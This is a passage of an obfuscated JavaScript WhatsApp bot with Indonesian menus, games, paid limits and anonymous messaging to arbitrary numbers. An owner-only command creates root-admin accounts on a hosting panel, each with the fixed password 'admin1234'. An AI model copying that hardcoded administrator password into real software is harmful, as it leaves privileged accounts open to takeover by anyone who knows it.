          let _0x13f5e3 = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x40a839.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa["public"] ? "Public" : "Self") + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x2b983f.split('@')[0x0] + "\n⨳ *Limit*: " + _0x3e2e7f.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0x3e2e7f.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + privacyMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x13995c = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + "ping",
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0x4ec3e2 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + 'menu'
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + 'daftar'
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + "owner"
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x307c7e = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': "application/pdf",
            'caption': _0x13f5e3,
            'footer': footer,
            'buttons': [..._0x13995c, ..._0x4ec3e2],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x307c7e, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case 'newslettermenu':
      case "newmenu":
        {
          let _0x3827fe = speed();
          let _0x558bef = speed() - _0x3827fe;
          let _0x420d22 = db.data.users[_0x3f87c6.sender];
          let _0x1ced26 = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0x187823 = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x558bef.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa["public"] ? "Public" : 'Self') + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x1ced26.split('@')[0x0] + "\n⨳ *Limit*: " + _0x420d22.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0x420d22.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + newsletterMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x3e59d7 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + "ping",
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0x13e865 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + "menu"
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + 'daftar'
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + "owner"
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x41e88f = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': "application/pdf",
            'caption': _0x187823,
            'footer': footer,
            'buttons': [..._0x3e59d7, ..._0x13e865],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x41e88f, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "aimenu":
      case "aimnu":
        {
          let _0x3e2c27 = speed();
          let _0x34387e = speed() - _0x3e2c27;
          let _0x3e570c = db.data.users[_0x3f87c6.sender];
          let _0x5e6d31 = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0x3873c6 = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x34387e.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa["public"] ? "Public" : "Self") + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x5e6d31.split('@')[0x0] + "\n⨳ *Limit*: " + _0x3e570c.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0x3e570c.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + aiMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0xb51381 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + "ping",
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0x32668f = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': footer,
                  'highlight_label': ownerName,
                  'rows': [{
                    'title': "📚 Semua Menu",
                    'description': "Lihat semua fitur yang tersedia!",
                    'id': _0x4773c6 + "allmenu"
                  }, {
                    'title': "🎀 Main Menu",
                    'description': "Lihat info tentang sistem bot!",
                    'id': _0x4773c6 + "menu"
                  }, {
                    'title': "👑 My Owner",
                    'description': "Hubungi nomor owner disini!",
                    'id': _0x4773c6 + "owner"
                  }, {
                    'title': "📜 Get Script",
                    'description': "Dapatkan script bot ini!",
                    'id': _0x4773c6 + "script"
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x1488a9 = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': "application/pdf",
            'caption': _0x3873c6,
            'footer': footer,
            'buttons': [..._0xb51381, ..._0x32668f],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x1488a9, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "othermenu":
      case "othmenu":
        {
          let _0x51023a = speed();
          let _0x98a1d9 = speed() - _0x51023a;
          let _0xf21508 = db.data.users[_0x3f87c6.sender];
          let _0x2f3007 = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0x186e78 = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x98a1d9.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa["public"] ? "Public" : "Self") + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x2f3007.split('@')[0x0] + "\n⨳ *Limit*: " + _0xf21508.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0xf21508.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + otherMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x2f9e39 = [{
            'buttonId': _0x4773c6 + 'owner',
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + "ping",
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0x535db1 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': 'single_select',
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + "menu"
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + "daftar"
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + "owner"
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x316fe8 = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': "application/pdf",
            'caption': _0x186e78,
            'footer': footer,
            'buttons': [..._0x2f9e39, ..._0x535db1],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x316fe8, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "slot":
        {
          if (!db.data.users[_0x3f87c6.sender]) {
            return _0x3a091f("⚠️ Data pengguna tidak ditemukan di database!");
          }
          await gameSlot(_0x59f5fa, _0x3f87c6, db.data.users);
        }
        break;
      case "casino":
        {
          if (!db.data.users[_0x3f87c6.sender]) {
            return _0x3a091f("⚠️ Data pengguna tidak ditemukan di database!");
          }
          await gameCasinoSolo(_0x59f5fa, _0x3f87c6, _0x4773c6, db.data.users);
        }
        break;
      case "daily":
        {
          if (!db.data.users[_0x3f87c6.sender]) {
            return _0x3a091f("⚠️ Data pengguna tidak ditemukan di database!");
          }
          await daily(_0x59f5fa, _0x3f87c6, db.data.users);
        }
        break;
      case "transferlimit":
        {
          if (!db.data.users[_0x3f87c6.sender]) {
            return _0x3a091f("⚠️ Data pengguna tidak ditemukan di database!");
          }
          await transferLimit(_0x59f5fa, _0x3f87c6, _0x143458, db.data.users);
        }
        break;
      case 'transfermoney':
      case "transferuang":
        {
          if (!db.data.users[_0x3f87c6.sender]) {
            return _0x3a091f("⚠️ Data pengguna tidak ditemukan di database!");
          }
          await transferUang(_0x59f5fa, _0x3f87c6, _0x143458, db.data.users);
        }
        break;
      case "buy":
        {
          if (!db.data.users[_0x3f87c6.sender]) {
            return _0x3a091f("⚠️ Data pengguna tidak ditemukan di database!");
          }
          await buy(_0x3f87c6, _0x143458, db.data.users);
        }
        break;
      case 'me':
      case "account":
        {
          if (!db.data.users[_0x3f87c6.sender]) {
            return _0x3a091f("⚠️ Data pengguna tidak ditemukan di database!");
          }
          let _0x4eb1d7 = db.data.users[_0x3f87c6.sender];
          let _0x5881f4 = '';
          _0x5881f4 += "*📋 Informasi User*\n";
          _0x5881f4 += "- *Nomor*: " + _0x1aa5ce + "\n";
          _0x5881f4 += "- *Nama*: " + (_0x4eb1d7.nama || "Belum diatur") + "\n";
          _0x5881f4 += "- *Umur*: " + (_0x4eb1d7.umur || "Belum diatur") + "\n";
          _0x5881f4 += "- *Asal Kota*: " + (_0x4eb1d7.askot || "Belum diatur") + "\n";
          _0x5881f4 += "- *Level*: " + (_0x4eb1d7.level || 0x0) + "\n";
          _0x5881f4 += "- *Exp*: " + (_0x4eb1d7.exp || 0x0) + "\n";
          _0x5881f4 += "- *Coins*: " + (_0x4eb1d7.coins || 0x0) + "\n";
          _0x5881f4 += "- *Status Premium*: " + (_0x4eb1d7.premium ? 'Ya' : "Tidak") + "\n";
          _0x5881f4 += "- *Status VIP*: " + (_0x4eb1d7.vip ? 'Ya' : "Tidak") + "\n";
          _0x5881f4 += "- *Rank*: " + (_0x4eb1d7.rank || "Belum ada") + "\n";
          _0x5881f4 += "- *Pacar*: " + (_0x4eb1d7.pacar ? '@' + _0x4eb1d7.pacar.replace("@s.whatsapp.net", '') : "Belum ada") + "\n";
          _0x5881f4 += "- *Gelar*: " + (_0x4eb1d7.title || "Tidak ada");
          let _0x1309c8 = [{
            'name': 'single_select',
            'buttonParamsJson': "{\n\t\t\t\t\t\t\"title\": \"Buy Limit\",\n\t\t\t\t\t\t\"sections\": [\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\"title\": \"Limit 1 - 1000\",\n\t\t\t\t\t\t\t\t\"rows\": [\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\"header\": \"Buy Limit 🟣\",\n\t\t\t\t\t\t\t\t\t\t\"title\": \"1 Limit - Rp. 500\",\n\t\t\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "buy limit 1\"\n\t\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\"header\": \"Buy Limit 🟠\",\n\t\t\t\t\t\t\t\t\t\t\"title\": \"50 Limit - Rp. 25.000\",\n\t\t\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "buy limit 50\"\n\t\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\"header\": \"Buy Limit 🟢\",\n\t\t\t\t\t\t\t\t\t\t\"title\": \"100 Limit - Rp. 50.000\",\n\t\t\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "buy limit 100\"\n\t\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\"header\": \"Buy Limit 🔴\",\n\t\t\t\t\t\t\t\t\t\t\"title\": \"500 Limit - Rp. 250.000\",\n\t\t\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "buy limit 500\"\n\t\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\"header\": \"Buy Limit 🟡\",\n\t\t\t\t\t\t\t\t\t\t\"title\": \"1000 Limit - Rp. 500.000\",\n\t\t\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "buy limit 1000\"\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t]\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t]\n\t\t\t\t\t}"
          }];
          _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x1309c8, _0x5881f4, footer, _0x3f87c6);
        }
        ;
        break;
      case "cekuser":
      case "infouser":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!db.data.users[_0x3f87c6.sender]) {
            return _0x3a091f("⚠️ Data pengguna tidak ditemukan di database!");
          }
          let _0x2beecf = '';
          if (!_0x143458[0x0]) {
            _0x2beecf += "Kamu perlu masukin nomor telepon user yang mau dicek ya! 😊\n\n";
            _0x2beecf += "*Contoh:*\n";
            _0x2beecf += _0x4773c6 + _0x4ac520 + " 6281234567890";
            return _0x3a091f(_0x2beecf);
          }
          let _0x2094ee = _0x143458[0x0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          if (!db.data.users[_0x2094ee]) {
            _0x2beecf += "Nomor *" + _0x143458[0x0] + "* belum terdaftar di database, kak. 😊";
            return _0x3a091f(_0x2beecf);
          }
          let _0x68da8a = db.data.users[_0x2094ee];
          _0x2beecf += "*📋 Informasi User*\n";
          _0x2beecf += "- *Nomor*: " + _0x143458[0x0] + "\n";
          _0x2beecf += "- *Nama*: " + (_0x68da8a.nama || "Belum diatur") + "\n";
          _0x2beecf += "- *Umur*: " + (_0x68da8a.umur || "Belum diatur") + "\n";
          _0x2beecf += "- *Asal Kota*: " + (_0x68da8a.askot || "Belum diatur") + "\n";
          _0x2beecf += "- *Level*: " + (_0x68da8a.level || 0x0) + "\n";
          _0x2beecf += "- *Exp*: " + (_0x68da8a.exp || 0x0) + "\n";
          _0x2beecf += "- *Coins*: " + (_0x68da8a.coins || 0x0) + "\n";
          _0x2beecf += "- *Status Premium*: " + (_0x68da8a.premium ? 'Ya' : 'Tidak') + "\n";
          _0x2beecf += "- *Status VIP*: " + (_0x68da8a.vip ? 'Ya' : "Tidak") + "\n";
          _0x2beecf += "- *Rank*: " + (_0x68da8a.rank || "Belum ada") + "\n";
          _0x2beecf += "- *Pacar*: " + (_0x68da8a.pacar || "Belum ada") + "\n";
          _0x2beecf += "- *Gelar*: " + (_0x68da8a.title || "Tidak ada") + "\n";
          return _0x3a091f(_0x2beecf);
        }
        break;
      case "limit":
      case "checklimit":
        {
          if (!db.data.users[_0x3f87c6.sender]) {
            return _0x3a091f("⚠️ Data pengguna tidak ditemukan di database!");
          }
          let _0x106ff4 = db.data.users[_0x3f87c6.sender];
          let _0x1e3af6 = "*📊 INFORMASI LIMIT 📊*\n\n";
          _0x1e3af6 += "- *Sisa Limit*: " + _0x470f24(_0x106ff4.limit) + "\n";
          _0x1e3af6 += "- *Total Limit*: " + _0x470f24(_0x106ff4.totalLimit) + "\n";
          _0x1e3af6 += "*Gunakan limit dengan bijak, ya!* 💼";
          await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': _0x1e3af6
          }, {
            'quoted': _0x3f87c6
          });
        }
        ;
        break;
      case "menfess":
      case "menfes":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          this.menfes = this.menfes || {};
          let _0x2c3cbc = Object.values(this.menfes).find(_0x4c0b64 => [_0x4c0b64.a, _0x4c0b64.b].includes(_0x3f87c6.sender));
          if (_0x2c3cbc) {
            return _0x3a091f("Uhh... Kamu masih ada di sesi " + _0x4ac520 + " yang sebelumnya nih, selesaikan dulu ya sebelum mulai yang baru! 🤭");
          }
          if (_0x3f87c6.isGroup) {
            return _0x3a091f("Maaf ya Kak, fitur ini cuma bisa dipakai di chat pribadi aja! 😅");
          }
          if (!_0x2b2627 || !_0x2b2627.includes('|')) {
            return _0x3a091f("Kamu bisa pakai format ini ya: " + (_0x4773c6 + _0x4ac520) + " nama|nomor|pesan\n\nContoh:\n" + (_0x4773c6 + _0x4ac520) + " " + _0xdd1e8d + '|' + _0x3f87c6.sender.split('@')[0x0] + "|Halo, apa kabar? 👋");
          }
          let [_0x52418d, _0x1a2d13, _0x16d731] = _0x2b2627.split('|');
          if (!_0x1a2d13 || !_0x16d731) {
            return _0x3a091f("Uh-oh, formatnya salah! Pastikan pakai format nama|nomor|pesan ya, Kak! 😄");
          }
          if (_0x1a2d13.startsWith('0') || isNaN(_0x1a2d13)) {
            return _0x3a091f("Nomornya gak valid, Kak! Gunakan format internasional tanpa awalan '0' ya! 🙏");
          }
          await _0x3f87c6.react('⏱️');
          let _0x30c9bf = "\nHai Kak, ada menfess nih 😊✨\n\n👤 *Dari*: " + _0x52418d + "\n✉️ *Pesan*: " + _0x16d731 + "\n\n_Pesan ini cuma disampaikan oleh bot ya, Kak! 🤖_";
          let _0x3bae02 = _0x3f87c6.sender;
          this.menfes[_0x3bae02] = {
            'id': _0x3bae02,
            'a': _0x3f87c6.sender,
            'b': _0x1a2d13 + '@s.whatsapp.net',
            'state': "WAITING"
          };
          const _0x5b117f = [{
            'name': 'single_select',
            'buttonParamsJson': "{\n\t\t\t\t\t\t\t\"title\": \"Click Here ⎙\",\n\t\t\t\t\t\t\t\"sections\": [\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\"title\": \"💌 Menerima atau Menolak Menfess\",\n\t\t\t\t\t\t\t\t\t\"rows\": [\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\"header\": \"🤗 Terima Menfess\",\n\t\t\t\t\t\t\t\t\t\t\t\"title\": \"🌟 Ya, Terima Menfess\",\n\t\t\t\t\t\t\t\t\t\t\t\"description\": \"Klik ini kalau mau menerima dan memproses menfess ini dengan baik! 🥰\",\n\t\t\t\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "balasmenfes\"\n\t\t\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\"header\": \"😔 Tolak Menfess\",\n\t\t\t\t\t\t\t\t\t\t\t\"title\": \"❌ Tidak, Tolak Menfess\",\n\t\t\t\t\t\t\t\t\t\t\t\"description\": \"Klik ini kalau menfess ini nggak mau diterima. 😢\",\n\t\t\t\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "tolakmenfes\"\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t]\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t]\n\t\t\t\t\t\t}"
          }];
          _0x59f5fa.sendButtonText(_0x1a2d13 + "@s.whatsapp.net", _0x5b117f, _0x30c9bf, footer, _0x2044ec);
          _0x3a091f("Yay! Pesan menfess berhasil dikirim ke " + _0x1a2d13 + ". Sekarang tinggal tunggu responsnya ya, Kak. Kalau gak ada balasan dalam 24 jam, jangan ditunggu lagi ya! 🤭");
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "balasmenfess":
      case "balasmenfes":
        {
          let _0x100219 = Object.values(this.menfes).find(_0x2f3249 => [_0x2f3249.a, _0x2f3249.b].includes(_0x3f87c6.sender));
          if (!_0x100219) {
            return _0x3a091f("Hmmm, sepertinya Kamu belum ada sesi menfess yang aktif deh. 😅");
          }
          let _0x2c0b13 = Object.values(this.menfes).find(_0x3c7a42 => [_0x3c7a42.a, _0x3c7a42.b].includes(_0x3f87c6.sender) && _0x3c7a42.state === "WAITING");
          if (!_0x2c0b13) {
            return _0x3a091f("Gak ada sesi menfess yang menunggu balasan dari Kamu nih. 😢");
          }
          let _0xb70d0c = [_0x2c0b13.a, _0x2c0b13.b].find(_0xe49667 => _0xe49667 !== _0x3f87c6.sender);
          _0x2c0b13.state = "CHATTING";
          this.menfes[_0x2c0b13.id] = {
            ..._0x2c0b13
          };
          await _0x59f5fa.sendMessage(_0xb70d0c, {
            'text': '_@' + _0x3f87c6.sender.split('@')[0x0] + " sudah menerima menfess Kamu, sekarang kalian bisa ngobrol lewat bot ini ya!_\n\n*Note*: Kalau mau berhenti, ketik aja .stopmenfess. 😉",
            'mentions': [_0x3f87c6.sender]
          });
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': "😊🎉 _Menfess sudah diterima, sekarang Kamu bisa ngobrol lewat bot ini ya!_\n\n*Note*: Kalau mau berhenti, tinggal ketik .stopmenfess. 🤗"
          });
        }
        break;
      case "tolakmenfess":
      case 'tolakmenfes':
        {
          let _0x96bf2c = Object.values(this.menfes).find(_0x236917 => [_0x236917.a, _0x236917.b].includes(_0x3f87c6.sender));
          if (!_0x96bf2c) {
            return _0x3a091f("Hmm, gak ada sesi menfess yang Kamu ikuti saat ini. 😕");
          }
          let _0x5330d6 = Object.values(this.menfes).find(_0x4072bc => [_0x4072bc.a, _0x4072bc.b].includes(_0x3f87c6.sender) && _0x4072bc.state === "WAITING");
          if (!_0x5330d6) {
            return _0x3a091f("Gak ada sesi menfess yang bisa ditolak saat ini, Kak! 😅");
          }
          let _0x2dec67 = [_0x5330d6.a, _0x5330d6.b].find(_0xbeccbc => _0xbeccbc !== _0x3f87c6.sender);
          await _0x59f5fa.sendMessage(_0x2dec67, {
            'text': "_Oops... @" + _0x3f87c6.sender.split('@')[0x0] + " menolak menfess Kamu nih. Gak apa-apa ya, semangat! 🤗_",
            'mentions': [_0x3f87c6.sender]
          });
          _0x3a091f("Menfess berhasil ditolak. Kalau ada yang lain, jangan sungkan buat coba lagi ya, Kak! ✋");
          delete this.menfes[_0x5330d6.id];
        }
        break;
      case "stopmenfess":
      case "stopmenfes":
        {
          let _0x104746 = Object.values(this.menfes).find(_0x335927 => [_0x335927.a, _0x335927.b].includes(_0x3f87c6.sender));
          if (!_0x104746) {
            return _0x3a091f("Kayaknya Kamu gak ada sesi menfess yang aktif saat ini deh. 😅");
          }
          let _0x424f28 = _0x104746.a === _0x3f87c6.sender ? _0x104746.b : _0x104746.a;
          await _0x59f5fa.sendMessage(_0x424f28, {
            'text': "_Teman chat menghentikan sesi menfess ini ya, Kak. Makasih udah coba fitur ini! 😊_",
            'mentions': [_0x3f87c6.sender]
          });
          _0x3a091f("Sesi menfess sudah dihentikan. Kalau mau mulai lagi, tinggal gunakan perintah yang sama ya, Kak! 😄");
          delete this.menfes[_0x104746.id];
        }
        break;
      case 'adduseradmin':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x50ecf1 = q.split(',');
          if (_0x50ecf1.length < 0x3) {
            return _0x3a091f("*Format salah!*\n\n*Penggunaan:*\n" + (_0x4773c6 + _0x4ac520) + " email,username,name,number/tag");
          }
          let _0x388eb1 = _0x50ecf1[0x0].trim().toLowerCase();
          let _0x4f33e7 = _0x50ecf1[0x1].trim();
          let _0xd59993 = _0x50ecf1[0x2].trim();
          let _0x281d53 = "admin1234".toLowerCase();
          try {
            let _0x31cd89 = await fetch(panel + "/api/application/users", {
              'method': "POST",
              'headers': {
                'Accept': 'application/json',
                'Content-Type': "application/json",
                'Authorization': "Bearer " + apiuser
              },
              'body': JSON.stringify({
                'email': _0x388eb1,
                'username': _0x4f33e7,
                'first_name': _0xd59993,
                'last_name': "Admin",
                'root_admin': true,
                'language': 'en',
                'password': _0x281d53
              })
            });
            let _0x27e8c9 = await _0x31cd89.json();
            if (_0x27e8c9.errors) {
